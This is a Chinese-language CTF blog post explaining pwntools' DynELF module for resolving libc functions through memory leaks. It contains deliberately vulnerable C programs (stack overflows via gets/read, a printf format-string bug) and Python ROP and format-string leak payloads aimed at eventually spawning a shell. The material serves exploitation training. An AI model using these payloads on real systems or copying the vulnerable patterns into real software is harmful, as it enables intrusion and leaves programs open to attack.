---
title: "Pwntools's DynELF module"
date: 2016-09-07
category: Bin
layout: post
---

## 0x00 简介

在CTF比赛中pwn也算是一个经典的项目了。最基本的pwn就是栈溢出的相关，也是大部分pwn中的低分题目。堆溢出在CTF中比较少，因为完成攻击耗时长且更加变幻莫测，基本上都是大分值的题目。

在栈溢出的pwn中，ret2libc应该是最多的payload构造手法了。"ret to ld\_reslove"相对较少且有可以替代的东西。

在ret2libc中，libc就变得至关重要了。经过基础的绕过后，最后真正的shellcode就是在libc中完成。但是，有些情况下程序内并没有想要的函数，也没有提供libc.so文件。这时候一般有两种办法：

1. 查找libc-database
2. 借助leak手法，leak出libc中需要的函数。

方法一的查库简单又快捷，只需要leak出got表中一个已经调用过的函数的地址。但是...有些情况下查不到库，或者库有些奇怪怎么办？或者，库使用的不熟练，没法正确查出相对offset...

为了做出万全的应对，也是应对libc-database这种"彩虹表"式方法的不完整性，在pwntools中专门提供了DynELF模块。

DynELF模块的作用便是借助可ROP的leak链，去搜索内存，在内存中直接find到需要函数的地址。经过测试，速度还是很快的。

DynELF的原理其实复杂的多，它也应用了像"ret to dl\_reslov"中借助了ELF\_hander的方法。不过这是之后需要研究的...

DynELF的使用方法和Python一样简单，这立主要笔记了在实际操作中遇到的各种未考虑到的坑。

## 0x01 DynELF模块

pwntools的作者在github上提供了完整的官方文档：

```python
# Assume a process or remote connection
p = process('./pwnme')

# Declare a function that takes a single address, and
# leaks at least one byte at that address.
def leak(address):
    data = p.read(address, 4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data

# For the sake of this example, let's say that we
# have any of these pointers.  One is a pointer into
# the target binary, the other two are pointers into libc
main   = 0xfeedf4ce
libc   = 0xdeadb000
system = 0xdeadbeef

# With our leaker, and a pointer into our target binary,
# we can resolve the address of anything.
#
# We do not actually need to have a copy of the target
# binary for this to work.
d = DynELF(leak, main)
assert d.lookup(None,     'libc') == libc
assert d.lookup('system', 'libc') == system

# However, if we *do* have a copy of the target binary,
# we can speed up some of the steps.
d = DynELF(leak, main, elf=ELF('./pwnme'))
assert d.lookup(None,     'libc') == libc
assert d.lookup('system', 'libc') == system

# Alternately, we can resolve symbols inside another library,
# given a pointer into it.
d = DynELF(leak, libc + 0x1234)
assert d.lookup('system')      == system
```

作者简单说了下原理，但是并没有看懂...而且例子也是让我看的好绕(毕竟不是实例状况下...)

Wooyun的@蒸米在drops上的"一步一步学ROP之linux\_x64篇"中进行了关于DynELF的讲解，原文如下：

> 但是我们要事先得到目标机器上的libc.so或者具体的linux版本号才能计算出相应的offset。那么如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。
>
> 这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。
>
> 随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF('./level2'))就可以对DynELF模块进行初始化了。然后可以通过调用system\_addr = d.lookup('system', 'libc')来得到libc.so中system()在内存中的地址。

之后给出了对应教程中的leak函数例子：

```python
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

d = DynELF(leak, elf=ELF('./level2'))
system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)
```

再结合doc中的示例，基本上简单易懂了。总计下简单的方法：

1. 构造一个可循环的ROP的链，该链可以leak任意内存地址的数值。
2. 将该链封装为一个函数，实现`传入任意地址 -> leak该地址数值`
3. 将该函数作为DynELF的参数之一，再加上doc中提到的任一指针，完成DynELF的初始化
4. DynELF初始化后返回一个对象。执行该对象的`lookup`方法即可完成目标函数的查找

这里附上doc的全部对象方法：

* bases()

    Resolve base addresses of all loaded libraries.

    Return a dictionary mapping library path to its base address.

* dynamic
    
    Returns: Pointer to the .DYNAMIC area.

* elfclass

    32 or 64

* static find\_base(leak, ptr)

    Given a pwnlib.memleak.MemLeak object and a pointer into a library, find its base address.

* link\_map

    Pointer to the runtime link\_map object

* lookup(symb = None, lib = None) → int

    Find the address of symbol, which is found in lib.
    
    Parameters: 

    * symb (str) – Named routine to look up
    * lib (str) – Substring to match for the library name. If omitted, the current library is searched. If set to 'libc', 'libc.so' is assumed.

    Returns: Address of the named symbol, or None.
    
## 0x02 实际使用

由上面的总结，在进行搜寻指定函数的过程中，实际情况下如下：

1. 之前的处理：扫描，逆向，定位溢出点，绕过各种防护，构造同用payload表达式
2. 构造leak函数
3. 初始化DynELF，执行lookup方法，get目标函数地址
4. 再次构造ROP，构造参数传入，执行payload
5. GET shell/GET flag

其中第2、3步是我们主要关注的。在实际操作中，因为第3步仅仅是执行一些函数，所以真正需要我们去完成的便是第2部的leak函数构造。

## 0x03 leak函数的构造

leak函数的普遍模式如下：

```python
def leak(addr):
    #各种预预处理
    payload = "xxxxxxxx" + p32(addr) + "xxxxxxxx"
    p.sendline(payload)
    #各种处理
    data = p.recv(4)
    #各种处理
    return data
```

在pwn中，可以打印指定内存内的数据的函数主要有以下几个：

* write(1, addr, len)
* puts(addr)
* printf("%s", addr)
* printf(format\_string)

这些函数都需要在程序中被使用过才会被链接(link)进来，下面会分别进行这几个函数的介绍

### write

write(fd, addr, len)

write函数在linux下被定义在`unistd.h`中。一般的pwn为了使用`setbuf()`等系统函数，一般都会包含该头文件。

write的作用其实是将一个指针指向的的数据写入到指定的文件流中，必须指定写入的数据长度。

在Linux的Terminal中，默认会打开三个文件流并和程序进行关联，他们的fd数值如下：

* 0：标准输入流(stdini)
* 1：标准输出流(stdout)
* 2：标准错误流(stderr)

所以可以使用write(1,addr,len)的方式进行屏幕字符打印。

在leak中，write虽然需要传入最多的参数(3个)，但是它却是这几个leak函数中最理想的：

**它的打印长度只受len参数控制**

为什么这么说呢？因为在实际打印中，会有另一个导致打印终止的字符存在：零字截断符(`\x00`)。

在printf和puts中是没有len参数需要的，取而代之的是用零字截断符作为字符串结束标记。但是问题就来了：在leak内存地址的时候，会经常碰见如`"0x3d690086"`这样的内存数据，这时候就会使实际打印出来的字符长度不确定。这个问题产生的具体影响和解决办法在下面的例子再说。

### puts

puts(addr)

puts定义在经典的`stdio.h`中，几乎是个有交互的程序都会使用。

puts的参数是这几个函数中最少的，只需要一个地址参数，在64位下可以很好的处理ROPgadget过少传参不足的情形。

puts在结果上等效于printf("%s",addr)，但是实际上却不是这么回事。但是这并不重要，它和printf在处理字符串的行为上是一致的。

puts会受到零字截断符的影响，需要在接收数据时进行细微处理。

### printf：format\_string

printf(format\_string)

这个printf的利用是指"格式化字符串"。printf同样定义在`stdio.h`中。

一般情况下如果有格式化字符串是很舒服的一件事。它能leak栈上信息，还能任意写，更可以像这样为了搜索函数进行任意读。可以说这一个漏洞点几乎涵盖了所有的危险要素。

在进行任意地址读时，格式一般是`printf("%m$s"+addr)`，m是具体的偏移量。

因为格式化字符串的使用不会破坏栈，所以在可以循环进行格式化字符串攻击的情况下是十分理想的函数。

printf的格式化参数形式也会受到零字截断符的影响，而且还是双重的影响，是处理最麻烦的，这个之后再说细节。

### printf

printf("%s",addr)

这个没什么好说的，就是最常用的printf写法。但是一般不怎么用这个，因为他的格式化参数(`"%s"`)是指针形态，并不能直接在栈上布置。不过程序内一般会用printf进行一般的字符打印，会在`.rdata`段内存在`"%s"`，可以直接定位拿来使用。要是没有的话，就需要两次写入，十分麻烦。

若是构造成功，他和puts在行为上等价，所以对于leak函数来说就是完全一样的。

后面直接把puts函数替换成printf即可，就不再单独说明了。

## 0x04 实例演示

### write

@蒸米的教程中，便是使用write进行的演示。

write的特性如前所说，它不受`\x00`的截断，会一直进行打印直到满足len的长度要求。所以，如果要打印的数据是`0x08040010`，在屏幕上就会直接打印`\x10\x00\x04\x08`(逆序是因为小端存储机制)。

所以使用write函数没有什么要注意的，直接进行接收(p.recv)即可。

演示代码如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char* binsh = "/bin/sh";

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}
int main(int argc, char** argv) {
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

计算好ROP链后，直接就能构造leak函数了：

```python
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    return data
```

很正常，就是这样。之后就像前面描述的一样去初始化DynELF即可。

### Puts

puts()比较常见，它在使用时有些东西就需要注意了。主要的特性有两个：

* 受`\x00`的影响
* 自动添加的`\n`

这里使用一段简单示例代码：

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

char* binsh = "/bin/sh";
void bar();

void bar(){
    char buff[64];
    puts("Welcome to test.");
    write(STDOUT_FILENO, "Will you leave some msg?\n", 25);
    gets(buff);
    printf("Thx.\n");
}
int main(void){
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);
    bar();
    return 0;
}
```

很明显，在gets()处发生了栈溢出。这里是使用的puts()函数进行的输出，可以用来构造leak函数：

```python
def leak_puts(addr):
    payload = 'A'*76 + p32(puts_plt) + p32(func_bar) + p32(addr)
    p.recvuntil('msg?\n')
    p.sendline(payload)
    p.recvuntil('Thx.\n')
    data = p.recvuntil('\nW')[:-2]
    #data = p.recvuntil('\nW')[:-2]可以被替换成data = p.recvuntil('\nW', True)
    if not data:
        data = '\x00'
    else:
        data = data[:4]
    return data
```

和write进行对比就会发现多了些东西。write时是直接使用了`p.recv(4)`，但是这里却使用了recvuntil()。

原因便是零字截断符的问题：如果我要打印的数据是`0x08040010`，那么使用puts进行输出的结果却是：`\x10`这一个字节。为什么会这样呢？因为在即将打印完`\x10`后，下一个读取出来的是`\x00`，而`\x00`在字符串中代表着字符串的结束。所以本来我们想打印的数据，却被当做特殊符号处理，导致了输出的提前结束。

而且，puts()的特性是一直进行打印，直到遇到`\x00`为止。这样当我们使用puts()时，我们根本不能提前确定puts()输出的字符长度是多少：可能是4，可能是64，也可能是0(如果要打印的第一个字符就是\x00，那么便当做"空字符串"处理，不进行输出)。使用recv(4)便会接收到我们不想要的数据。

这里在说下puts()的一个原生特性：它会在输出的结尾自动添加一个换行符\n...不过，这其实是废话(因为这就是puts为什么叫做puts的原因...)。

那么，怎么处理截断这个问题呢？

* 那我们使用recvuntil("\n")不就好了？因为一定会在结尾输出\n的呀！

真是抱歉....如果写过正则表达式的话，这是显而易见的错误：recvuntil()默认是第一次匹配到指定字符就会返回的...如果要打印的数据是`0x08000A10`的话，完整的输出是：`\x10\x0A\x0A`(\n的ASCII码就是\x0A)

这么做就会产生错误的判断...

* 所以，按照写正则表达式的思路，我们需要用一个一定正确的特征去进行拦截

比如示例里，ROP循环回来会输出："Welcome to test."，那么打印完我们的数据，紧接着就会输出这句话。

我们就可以使用：recvuntil("\nWelcome")进行拦截。

* 万一第一个字符就是\x00，即没打印信息怎么办？

如果直接返回None的话，会引发EOFError的异常。但这并不是我们想要的：我们需要在检测到空打印的时候返回\x00，也就是正确的，应该打印的这个值。DynELF会自动判断每次leak出的数据长度，自动进行地址计算。

总结一下:

1. 在打印的数据中正确的筛选我们需要的部分
2. 如果本次打印了空字符串，需要手动返回\x00

### printf：format string

printf和puts是一样的，只是没有自动添加的\n，这里就不再说了。

这里说一下利用printf的格式化字符串攻击来进行任意的leak。

在进行查格式化字符串利用是，要注意以下特性：

* 受\x00的影响
* 自身打印的字符也受\x00的影响

示例代码如下：

```c
#include "stdio.h"
#include "stdlib.h"
#include "unistd.h"

void foo();
char binsh[] = "/bin/sh";

int main(int argc, char const *argv[])
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    foo();
    return 0;
}
void foo(){
    char buff[64];
    while(1){
        printf("\nI will say what you say:\n");
        gets(buff);
        if(!strcmp(buff,"exit")){
            printf("Will you get %s?\n", binsh);
            break;
        }else{
            printf(buff);
        }
    }
}
```

为了方便的进行练习，我写了个一直可以无限使用的格式化字符串。

让我们看看这时的leak函数：

```python
def leak(addr):
    leakinfo = '%6$s' + '\x00'*4 + p32(addr)
    p.recvuntil('say:\n')
    p.sendline(leakinfo)
    data = p.recvuntil('\nI')[:-2]
    #data = p.recvuntil('\nI')[:-2]同样可以被替换为data = p.recvuntil('\nI', True)
    if not data:
        data = '\x00'
    else:
        data = data[:4] 
    return data
```

可以看到基本上和puts()的leak函数长得差不多。上面说的第一个特性(受\x00影响)在puts()函数的部分已经说过了，这里解释一下奇怪的特性二：自身打印的字符也受\x00的影响

在0x03中已经说明了，格式化字符串的构成是：`%m$s' + p32(addr)`，m为具体情况下的栈中偏移。

这里，p32(addr)的作用是用作`%s`的参数。但是他本身也包含在这个输入的字符串中。所以在`%s`处理完，打印出我们想要leak的数值之后，p32(addr)本身又会被当做普通字符串打印出来。

简单地说，如果`0xBF62ED80`处存储着`0x08046234`的话，我们去leak`0xbf62ED80`后，完整的输出如下：

```bash
\x34\x62\x04\x08\x80\xED\x62\xBF
```

如果`0xBF62ED80`中存储的是`0x08040010`那么完整的输出是：

```bash
\x10\x80\xED\x62\xBF
```

貌似我们只要接收recvuntil(p32(addr))就好了？但是...

如果我们想leak的地址是`0xBF00106D`，里面存储的是`0x08046234`，完整的输出却是：

```bash
\x34\x62\x04\x08\x6D\x10
```

怎么会这样？因为在输出`0xBF00106D`时，再次遇到了`\x00`。虽然这个\x00被正常的车send了，却并不能完整的被printf打印出来...

更糟的是：`0xBF00106D`里面存储着`0x08040010`，完整的输出只有：`\x10\x6D\x10`

完全凌乱了......

怎么办？我们可以解决leak的数据的不完整，但是这双重的截断却没法找到一个比较好的接收特征。

恩...我们知道addr的数值，或者分析一下？

也许不错，但是有更好的偷懒方式：

```python
leakinfo = '%m$s' + '\x00'*4 + p32(addr)
#m是具体的偏移量
```

我们在p32(addr)之前手动加入4个\x00(加入4个而不是1个是为了和栈空间对齐)，这样的话，当打印完我们想要leak的数据之后，就直接被我们添加的\x00截断了，根本不会输出p32(addr)。这样一来，就和puts()函数一样了呢~

## 0x05 总结

其实DynELF本身很简单，这里只是长篇累牍的笔记了实际中会遇到的问题。都是小问题，但是却很烦。

总结一下：

* write()最理想，打印任何字符
* puts()打印的数据会被`\x00`截断，注意正确的筛选出来我们需要的部分。
* printf(format\_string)会受到双重`\x00`截断，注意合理的处理不需要的部分

* 其实pwntools中的recv()是支持正则表达式的，这些说白了都是解析字符串的事，用正则或许很舒服

具体使用时，可能会受到不能send`\x00`的情况等等问题，就没法展开说了。其实总结起来就是一句话：

**让leak函数返回目标地址中的正确数值！**

仅此而已。其他的都是套路。

**--End--**
